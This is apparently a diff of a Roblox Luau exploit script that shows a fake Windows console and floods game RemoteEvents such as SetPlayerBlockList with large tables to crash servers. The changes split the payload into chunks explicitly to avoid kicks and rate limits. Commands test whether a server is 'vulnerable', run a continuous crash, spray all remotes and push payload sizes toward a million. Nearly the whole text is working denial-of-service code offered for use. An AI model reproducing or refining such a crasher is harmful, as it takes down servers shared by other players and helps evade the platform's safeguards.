@@ -8,11 +8,11 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- ═══════════ CORE LOGIC ═══════════
-local Children       = 180000
-local FireBurst      = 1.5
+local TargetSize     = 180000 -- Total items to send
+local ChunkSize      = 10000  -- ✅ SAFE: 10k chunks prevent Error 261 at high numbers
 local Format         = "pair"
 
-local state = { running = false, thread = nil, remote = nil, cache = nil, passes = 0, isSpam = false }
+local state = { running = false, thread = nil, remote = nil, chunkCache = nil, passes = 0, isSpam = false }
 local RemoteCandidates = {
     { "RobloxReplicatedStorage", "SetPlayerBlockList" },
     { "ReplicatedStorage",       "SetPlayerBlockList" },
@@ -46,11 +46,23 @@ local function findSpamRemotes()
     end
 end
 
-local function build(size)
-    local sz = size or Children
-    local root = table.create(sz)
-    for i = 1, sz do root[i] = { id = i, v = i * 2 } end
+local function buildChunk()
+    local root = table.create(ChunkSize)
+    for i = 1, ChunkSize do root[i] = { id = i, v = i * 2 } end
     return root
+end
+
+-- ✅ CHUNKING LOGIC: Safely sends data without kicking you
+local function sendPayload(remote)
+    if not state.chunkCache then state.chunkCache = buildChunk() end
+    local chunksNeeded = math.ceil(TargetSize / ChunkSize)
+    
+    for _ = 1, chunksNeeded do
+        pcall(function() remote:FireServer(state.chunkCache) end)
+        -- Yield 0.02s between chunks to let network buffer drain
+        task.wait(0.02) 
+    end
+    state.passes += 1
 end
 
 local function fire()
@@ -58,18 +70,18 @@ local function fire()
         state.remote = resolve()
         if not state.remote then return end
     end
-    if not state.cache then state.cache = build() end
     
     if state.isSpam then
+        local chunksNeeded = math.ceil(TargetSize / ChunkSize)
         for _, r in ipairs(spamRemotes) do
-            pcall(function() r:FireServer(state.cache) end)
+            for _ = 1, chunksNeeded do
+                pcall(function() r:FireServer(state.chunkCache) end)
+                task.wait(0.02)
+            end
         end
     else
-        for _ = 1, FireBurst do
-            state.remote:FireServer(state.cache)
-        end
+        sendPayload(state.remote)
     end
-    state.passes += 1
 end
 
 local function getPing()
@@ -83,53 +95,14 @@ local function startCrash(isSpam)
     state.isSpam = isSpam
     state.passes = 0
     
+    if not state.chunkCache then state.chunkCache = buildChunk() end
     if isSpam then findSpamRemotes() end
     
     state.thread = task.spawn(function()
         while state.running do
-            if state.isSpam then
-                pcall(fire)
-                task.wait(0.05)
-            else
-                -- ✅ ADAPTIVE SYNC (Calculates exact server CD)
-                local pBefore = getPing()
-                pcall(fire)
-                
-                if type(updateStatus) == "function" then
-                    updateStatus("Fired! Waiting for server spike...", Color3.fromRGB(0, 200, 255))
-                end
-                
-                -- 1. Wait for the server to react (ping spike)
-                local timeOut = tick() + 2.5
-                local spiked = false
-                while tick() < timeOut and state.running do
-                    if getPing() > pBefore + 100 then
-                        spiked = true
-                        break
-                    end
-                    task.wait(0.05)
-                end
-                
-                -- 2. If it spiked, wait EXACTLY until it drops back down
-                if spiked then
-                    if type(updateStatus) == "function" then
-                        updateStatus("Server Processing... Waiting for exact CD", Color3.fromRGB(255, 200, 50))
-                    end
-                    while getPing() > pBefore + 50 and state.running do
-                        task.wait(0.2)
-                    end
-                    if type(updateStatus) == "function" then
-                        updateStatus("Server Ready! Firing...", Color3.fromRGB(0, 255, 0))
-                    end
-                    task.wait(0.1) -- Exact millisecond buffer
-                else
-                    -- If it didn't spike, the server ignored it. Wait 2 seconds to not trigger their rate limit filter.
-                    if type(updateStatus) == "function" then
-                        updateStatus("Ignored. Buffering CD...", Color3.fromRGB(255, 50, 50))
-                    end
-                    task.wait(2)
-                end
-            end
+            pcall(fire)
+            -- Fast loop since sendPayload already yields for chunks
+            task.wait(0.05) 
         end
     end)
 end
@@ -138,7 +111,7 @@ local function stopCrash()
     state.running = false
     if state.thread then pcall(task.cancel, state.thread) end
     state.thread = nil
-    state.cache = nil
+    state.chunkCache = nil
 end
 
 -- ═══════════ CMD PROMPT UI ═══════════
@@ -155,7 +128,7 @@ main.AnchorPoint = Vector2.new(0.5, 0.5)
 main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
 main.BorderSizePixel = 1
 main.BorderColor3 = Color3.fromRGB(60, 60, 60)
-main.Active = true -- 🚨 FIX: Allows text to be typed!
+main.Active = true -- ✅ Allows typing
 main.Parent = screenGui
 
 local titleBar = Instance.new("Frame")
@@ -241,10 +214,9 @@ inputBox.TextColor3 = Color3.fromRGB(0, 255, 0) -- 🚨 Green typing
 inputBox.TextSize = 15
 inputBox.TextXAlignment = Enum.TextXAlignment.Left
 inputBox.ClearTextOnFocus = false
-inputBox.Active = true -- 🚨 FIX: Box must be active
+inputBox.Active = true
 inputBox.Parent = inputBar
 
--- ✅ Fake Blinking Cursor
 local cursor = Instance.new("TextLabel")
 cursor.Size = UDim2.new(0, 10, 1, 0)
 cursor.Position = UDim2.new(0, 160, 0, 0)
@@ -286,7 +258,7 @@ local function log(text, color)
     txt.BackgroundTransparency = 1
     txt.Font = Enum.Font.Code
     txt.Text = text
-    txt.TextColor3 = color or Color3.fromRGB(0, 255, 0) -- 🚨 Default Green
+    txt.TextColor3 = color or Color3.fromRGB(0, 255, 0)
     txt.TextSize = 14
     txt.TextXAlignment = Enum.TextXAlignment.Left
     txt.TextWrapped = true
@@ -295,27 +267,6 @@ local function log(text, color)
         consoleFrame.CanvasPosition = Vector2.new(0, listLayout.AbsoluteContentSize.Y)
     end)
 end
-
--- ✅ Function to update the live status line
-local statusLabel
-function updateStatus(text, color)
-    if statusLabel then
-        statusLabel.Text = text
-        statusLabel.TextColor3 = color
-    end
-end
-
--- Create status bar at bottom
-statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -16, 0, 14)
-statusLabel.Position = UDim2.new(0, 8, 1, -52)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Font = Enum.Font.Code
-statusLabel.Text = "Idle."
-statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-statusLabel.TextSize = 12
-statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-statusLabel.Parent = main
 
 local dragging = false
 local dragStart, startPos
@@ -351,12 +302,10 @@ minBtn.MouseButton1Click:Connect(function()
         main.Size = UDim2.new(0, 700, 0, 30)
         consoleFrame.Visible = false
         inputBar.Visible = false
-        statusLabel.Visible = false
     else
         main.Size = UDim2.new(0, 700, 0, 450)
         consoleFrame.Visible = true
         inputBar.Visible = true
-        statusLabel.Visible = true
     end
 end)
 
@@ -369,19 +318,18 @@ local function processCommand(input)
     
     if cmd == "!help" then
         log("Available Commands:", Color3.fromRGB(0, 255, 0))
-        log("  !test           - Check if the server is vulnerable", Color3.fromRGB(0, 200, 255))
-        log("  !crash          - Auto-Sync Crasher (Exact CD)", Color3.fromRGB(200, 200, 200))
-        log("  !spam           - Bypasses CD, sprays ALL remotes", Color3.fromRGB(255, 100, 255))
+        log("  !test           - Check if server is vulnerable (Safe)", Color3.fromRGB(0, 200, 255))
+        log("  !crash          - Start continuous crash", Color3.fromRGB(200, 200, 200))
+        log("  !spam           - Spray ALL remotes at once", Color3.fromRGB(255, 100, 255))
         log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
-        log("  !limit          - Find max safe size", Color3.fromRGB(200, 200, 200))
+        log("  !limit          - Auto-test up to 1,000,000 safely", Color3.fromRGB(200, 200, 200))
         log("  !size <number>  - Set payload size", Color3.fromRGB(200, 200, 200))
-        log("  !burst <number> - Set fire burst", Color3.fromRGB(200, 200, 200))
         log("  !ping           - Check server ping", Color3.fromRGB(200, 200, 200))
         log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
         log("  !exit           - Close prompt", Color3.fromRGB(200, 200, 200))
         
     elseif cmd == "!test" then
-        log("[*] Starting Server Vulnerability Test...", Color3.fromRGB(0, 200, 255))
+        log("[*] Starting Safe Server Test...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
             local remote = resolve()
             if not remote then 
@@ -392,27 +340,28 @@ local function processCommand(input)
             local wasRunning = state.running
             if wasRunning then stopCrash() end
             
-            local testSize = 100000
-            log("[*] Firing " .. testSize .. " payload...", Color3.fromRGB(200, 200, 200))
+            -- Test 200k using safe chunks
+            local testSize = 200000
+            local chunksNeeded = math.ceil(testSize / ChunkSize)
+            log("[*] Firing " .. testSize .. " payload (Safe Chunking)...", Color3.fromRGB(200, 200, 200))
             
             local before = getPing()
+            local p = buildChunk()
             
-            local p = {}
-            for j = 1, testSize do
-                p[j] = {id = j, v = j}
-                if j % 10000 == 0 then task.wait() end
+            for i = 1, chunksNeeded do
+                pcall(function() remote:FireServer(p) end)
+                task.wait(0.02) -- Safe yield
             end
             
-            pcall(function() remote:FireServer(p) end)
             log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
-            
             task.wait(3)
+            
             local after = getPing()
             local spike = after - before
             
             log(string.format("[*] Baseline: %dms | After: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
             
-            if spike > 150 or after > 500 then
+            if spike > 100 or after > 400 then
                 log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
                 log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
             else
@@ -424,7 +373,7 @@ local function processCommand(input)
 
     elseif cmd == "!spam" then
         if state.running then stopCrash() end
-        log("[!!!] SPAM MODE ACTIVATED. Ignoring CD...", Color3.fromRGB(255, 100, 255))
+        log("[!!!] SPAM MODE ACTIVATED. Spraying ALL remotes...", Color3.fromRGB(255, 100, 255))
         startCrash(true)
 
     elseif cmd == "!crash" then
@@ -432,7 +381,7 @@ local function processCommand(input)
             log("[!] Payload is already running!", Color3.fromRGB(255, 200, 50))
         else
             startCrash(false)
-            log("[+] Auto-Sync Crasher started. Reading server ping for exact CD.", Color3.fromRGB(0, 255, 0))
+            log("[+] Crasher started. Firing continuously.", Color3.fromRGB(0, 255, 0))
         end
         
     elseif cmd == "!stop" then
@@ -441,7 +390,6 @@ local function processCommand(input)
         else
             stopCrash()
             log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
-            updateStatus("Idle.", Color3.fromRGB(200, 200, 200))
         end
         
     elseif cmd == "!ping" then
@@ -449,7 +397,7 @@ local function processCommand(input)
         log("[*] Current Server Ping: " .. p .. "ms", Color3.fromRGB(0, 200, 255))
         
     elseif cmd == "!limit" then
-        log("[*] Starting Auto-Limit Test. Pushing up to 1,000,000...", Color3.fromRGB(0, 200, 255))
+        log("[*] Starting Auto-Limit Test. Pushing up to 1,000,000 safely...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
             local remote = resolve()
             if not remote then return end
@@ -462,31 +410,23 @@ local function processCommand(input)
             
             for _, sz in ipairs(sizes) do
                 log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
+                local chunks = math.ceil(sz / ChunkSize)
+                local p = buildChunk()
                 
-                local p = {}
-                for j = 1, sz do
-                    p[j] = {id = j, v = j}
-                    if j % 20000 == 0 then task.wait() end
+                for i = 1, chunks do
+                    pcall(function() remote:FireServer(p) end)
+                    task.wait(0.02) -- Safe yield for big numbers
                 end
                 
-                pcall(function() remote:FireServer(p) end)
                 log("[*] Waiting 5s for server to process...", Color3.fromRGB(200, 200, 200))
-                
-                local cd = 5
-                while cd > 0 do
-                    updateStatus(string.format("Testing %d... CD: %ds", sz, cd), Color3.fromRGB(0, 200, 255))
-                    task.wait(1)
-                    cd -= 1
-                end
-                
+                task.wait(5)
                 bestSize = sz
             end
             
-            Children = bestSize
-            state.cache = nil
+            TargetSize = bestSize
+            state.chunkCache = nil
             
             log("[*] RECOMMENDED SAFE LIMIT: " .. bestSize, Color3.fromRGB(0, 200, 255))
-            updateStatus("Test complete.", Color3.fromRGB(0, 255, 0))
             
             if wasRunning then startCrash(false) end
         end)
@@ -502,20 +442,11 @@ local function processCommand(input)
     elseif args[1] == "!size" then
         local num = tonumber(args[2])
         if num and num > 1000 then
-            Children = math.floor(num)
-            state.cache = nil
-            log("[+] Payload size set to " .. tostring(Children), Color3.fromRGB(0, 255, 0))
+            TargetSize = math.floor(num)
+            state.chunkCache = nil
+            log("[+] Target size set to " .. tostring(TargetSize), Color3.fromRGB(0, 255, 0))
         else
             log("[!] Invalid number. Example: !size 180000", Color3.fromRGB(255, 50, 50))
-        end
-        
-    elseif args[1] == "!burst" then
-        local num = tonumber(args[2])
-        if num and num > 0 then
-            FireBurst = num
-            log("[+] Fire Burst set to " .. tostring(FireBurst), Color3.fromRGB(0, 255, 0))
-        else
-            log("[!] Invalid number. Example: !burst 2", Color3.fromRGB(255, 50, 50))
         end
         
     elseif cmd == "" then
@@ -539,7 +470,7 @@ log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200)
 log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
 log("", Color3.fromRGB(200, 200, 200))
 log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: Use '!crash'. It uses auto-sync to hit exactly when the server is ready.", Color3.fromRGB(0, 200, 255))
+log("Pro tip: Use '!limit' to safely test up to 1 Million without kicking.", Color3.fromRGB(0, 200, 255))
 log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
